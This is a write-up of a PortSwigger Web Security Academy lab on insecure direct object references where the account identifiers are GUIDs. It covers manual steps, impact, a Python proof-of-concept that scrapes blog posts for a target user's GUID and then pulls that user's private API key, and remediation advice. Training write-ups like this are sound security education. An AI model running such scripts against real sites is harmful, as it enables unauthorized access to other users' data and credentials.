# IDOR with Unpredictable (GUID) Identifiers — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-08-01

## The Problem

Like lab 7, the account page decided whose data to return based on a client-supplied `id` parameter (`/my-account?id=...`), without verifying the requester was authorized to view that specific account. The difference here is that the `id` was a long, random-looking GUID (e.g. `7b1b2e3a-...`) instead of a simple guessable username — intended to make it harder for an attacker to target another user's account directly.

However, an unpredictable identifier is not real access control (the same lesson as lab 2's random admin URL): if the GUID leaks anywhere else in the application (e.g. attached to public content like blog posts or comments), an attacker can recover it and use it exactly as before.

## Discovery / Exploitation

1. Log in as a normal user (`wiener` / `peter`)
2. Browse the site's public content (e.g. blog posts) and notice that each post/comment is linked to its author via a `userId` parameter containing the same type of GUID used by `/my-account?id=`
3. Search through posts/comments to find one authored by the target user (`carlos`), and extract their `userId` (GUID) from that page
4. Request `/my-account?id=<carlos's GUID>` — the server returns `carlos`'s account data, including their private API key, despite the request still being authenticated as `wiener`

## Impact

Even though the account identifier is unpredictable on its own, it is exposed elsewhere in the application (public posts/comments), letting any user recover another user's identifier and access their private data — including a sensitive API key. The underlying flaw is identical to lab 7: the server trusts a client-supplied identifier without verifying it belongs to the authenticated user.

## Proof of Concept (Python)

This script logs in as the low-privileged user, scans the site's posts to find one authored by `carlos` and extract their GUID, then requests `carlos`'s account page using that GUID to retrieve their leaked API key.

```python
import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def carlos_guid(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    res = r.text

    post_ids = re.findall(r'postId=(\w+)', res)
    unique_post_ids = list(set(post_ids))

    for post_id in unique_post_ids:
        r = s.get(url + "/post?postId=" + post_id, proxies=proxies, verify=False)
        res = r.text

        if "carlos" in res:
            print("(+) found carlos's post")
            match = re.search(r"userId=(.*?)'", res)
            if match:
                guid = match.group(1)
                print("(+) found carlos's guid:", guid)
                return guid

    print("(-) could not find carlos's guid")
    sys.exit(-1)


def carlos_api_key(s, url):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    print("(+) logging in as wiener user...")
    data_login = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text

    if "logout" in res:
        print("(+) login successful...")

        guid = carlos_guid(s, url)
        carlos_url = url + "/my-account?id=" + guid
        r = s.get(carlos_url, verify=False, proxies=proxies)
        res = r.text

        if "carlos" in res:
            print("(+) successfully accessed carlos's account....")
            print("(+) retrieving API key")

            match = re.search(r"API Key is:(.*?)</div>", res)
            if match:
                api_key = match.group(1)
                print("(+) API KEY is: " + api_key)
            else:
                print("(-) could not find API key in the response")
                sys.exit(-1)
        else:
            print("(-) could not access account")
            sys.exit(-1)
    else:
        print("(-) login failed")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    carlos_api_key(s, url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Fetches the login page, extracts the CSRF token, and logs in as `wiener`
2. Fetches the site's homepage and extracts all `postId` values found in links
3. Visits each post, checking if it was authored by `carlos`, and extracts the `userId` (GUID) from that post's page
4. Requests `/my-account?id=<guid>` using the discovered GUID instead of the logged-in user's own id
5. Extracts the leaked API key from the response

## Remediation

An identifier being hard to guess does not make it a security boundary. The server must, on every request to `/my-account`:
1. Identify the actual authenticated user from their session — never from the `id` parameter
2. Verify that the requested `id` matches the authenticated user's own identity, or that they have explicit permission to view that record
3. Avoid exposing other users' internal identifiers (like GUIDs) in unrelated public content (e.g. post/comment metadata) where they can be harvested and reused
